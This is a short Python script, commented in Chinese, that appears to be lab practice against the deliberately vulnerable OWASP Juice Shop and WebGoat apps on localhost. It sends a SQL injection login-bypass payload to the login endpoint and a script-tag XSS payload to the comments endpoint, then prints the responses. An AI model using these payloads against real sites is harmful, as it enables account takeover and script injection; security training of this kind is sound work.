#!/usr/bin/env python3
import requests
import json

def test_sql_injection():
    """測試Juice Shop SQL注入漏洞"""
    url = "http://localhost:3000/rest/user/login"
    
    # SQL注入payload
    payload = {
        "email": "admin@juice-sh.op' OR 1=1--",
        "password": "anything"
    }
    
    try:
        print("🎯 正在測試SQL注入漏洞...")
        print(f"目標: {url}")
        print(f"Payload: {payload}")
        
        response = requests.post(url, json=payload, timeout=10)
        
        print(f"✅ 狀態碼: {response.status_code}")
        print(f"響應長度: {len(response.text)}")
        print(f"響應內容: {response.text[:500]}")
        
        if response.status_code == 200:
            print("🚨 可能的SQL注入成功!")
        else:
            print("⚠️ SQL注入似乎被阻止")
            
    except Exception as e:
        print(f"❌ 測試失败: {e}")

def test_xss():
    """測試XSS漏洞"""
    url = "http://localhost:3000/rest/user-comments"
    
    payload = {
        "comment": "<script>alert('XSS TEST')</script>",
        "rating": 5
    }
    
    try:
        print("\n🎯 正在測試XSS漏洞...")
        print(f"目標: {url}")
        print(f"Payload: {payload}")
        
        response = requests.post(url, json=payload, timeout=10)
        print(f"✅ 狀態碼: {response.status_code}")
        print(f"響應內容: {response.text[:300]}")
        
    except Exception as e:
        print(f"❌ XSS測試失敗: {e}")

def test_basic_info():
    """獲取基本信息"""
    endpoints = [
        "http://localhost:3000",
        "http://localhost:3000/api",
        "http://localhost:3000/rest",
        "http://localhost:8080/WebGoat"
    ]
    
    for endpoint in endpoints:
        try:
            response = requests.get(endpoint, timeout=5)
            print(f"✅ {endpoint}: {response.status_code}")
        except Exception as e:
            print(f"❌ {endpoint}: {e}")

if __name__ == "__main__":
    print("🚀 開始真實漏洞驗證測試")
    print("="*50)
    
    test_basic_info()
    print()
    test_sql_injection()
    test_xss()
    
    print("\n✅ 測試完成!")